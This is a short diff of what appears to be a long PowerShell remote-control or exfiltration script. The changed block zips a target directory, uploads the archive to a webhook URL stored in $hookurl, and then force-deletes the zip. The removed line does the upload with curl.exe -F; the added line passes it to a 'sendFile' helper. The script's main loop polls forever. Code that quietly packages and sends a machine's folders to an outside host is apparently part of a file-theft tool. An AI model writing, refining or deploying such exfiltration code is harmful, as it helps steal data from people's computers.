@@ -711,7 +711,7 @@ param ([string[]]$Path)
             $tempZipFilePath = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), [System.IO.Path]::GetFileName($path))
             Add-Type -AssemblyName System.IO.Compression.FileSystem
             [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $tempZipFilePath)
-            curl.exe -F file1=@"$tempZipFilePath" $hookurl | Out-Null
+            sendFile -sendfilePath $tempZipFilePath | Out-Null
             sleep 1
             Rm -Path $tempZipFilePath -Recurse -Force
         }else{
@@ -2016,3 +2016,4 @@ while ($true) {
     }
     Sleep 3
 }
+
